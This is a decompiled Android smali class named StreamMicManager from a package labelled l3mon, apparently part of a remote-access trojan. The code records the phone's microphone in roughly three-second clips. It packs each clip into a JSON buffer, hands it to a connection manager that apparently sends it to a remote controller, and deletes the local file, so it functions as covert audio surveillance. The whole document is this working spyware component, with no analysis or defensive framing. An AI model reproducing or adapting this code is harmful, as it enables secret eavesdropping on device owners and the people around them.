.class public Lcom/etechd/l3mon/StreamMicManager;
.super Ljava/lang/Object;
.source "StreamMicManager.java"

# static fields
.field private static isRecording:Z

.field private static clipId:I

.field static recorder:Landroid/media/MediaRecorder;

# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/etechd/l3mon/StreamMicManager;->isRecording:Z

    sput v0, Lcom/etechd/l3mon/StreamMicManager;->clipId:I

    const/4 v1, 0x0

    sput-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method public static startStreaming()V
    .locals 1

    const/4 v0, 0x1

    sput-boolean v0, Lcom/etechd/l3mon/StreamMicManager;->isRecording:Z

    const/4 v0, 0x0

    sput v0, Lcom/etechd/l3mon/StreamMicManager;->clipId:I

    invoke-static {}, Lcom/etechd/l3mon/StreamMicManager;->recordNextClip()V

    return-void
.end method

.method public static stopStreaming()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/etechd/l3mon/StreamMicManager;->isRecording:Z

    sget-object v0, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_0

    :try_start_0
    sget-object v0, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget-object v0, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    const/4 v0, 0x0

    sput-object v0, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    :cond_0
    return-void
.end method

.method private static recordNextClip()V
    .locals 8

    sget-boolean v0, Lcom/etechd/l3mon/StreamMicManager;->isRecording:Z

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-static {}, Lcom/etechd/l3mon/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    const-string v1, "stream"

    const-string v2, ".mp3"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v2, 0x2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v2, 0x3

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v1, Lcom/etechd/l3mon/StreamMicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    new-instance v2, Lcom/etechd/l3mon/StreamMicManager$1;

    invoke-direct {v2, v0}, Lcom/etechd/l3mon/StreamMicManager$1;-><init>(Ljava/io/File;)V

    const-wide/16 v3, 0xbb8

    invoke-virtual {v1, v2, v3, v4}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    goto :goto_0

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method static synthetic access$000(Ljava/io/File;)V
    .locals 0

    invoke-static {p0}, Lcom/etechd/l3mon/StreamMicManager;->sendClip(Ljava/io/File;)V

    return-void
.end method

.method static synthetic access$100()V
    .locals 0

    invoke-static {}, Lcom/etechd/l3mon/StreamMicManager;->recordNextClip()V

    return-void
.end method

.method private static sendClip(Ljava/io/File;)V
    .locals 6

    :try_start_0
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v1

    long-to-int v1, v1

    new-array v1, v1, [B

    invoke-virtual {v0, v1}, Ljava/io/FileInputStream;->read([B)I

    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "stream"

    const/4 v3, 0x1

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v2, "id"

    sget v3, Lcom/etechd/l3mon/StreamMicManager;->clipId:I

    add-int/lit8 v4, v3, 0x1

    sput v4, Lcom/etechd/l3mon/StreamMicManager;->clipId:I

    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v2, "buffer"

    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->sendStreamBuffer(Lorg/json/JSONObject;)V

    invoke-virtual {p0}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method
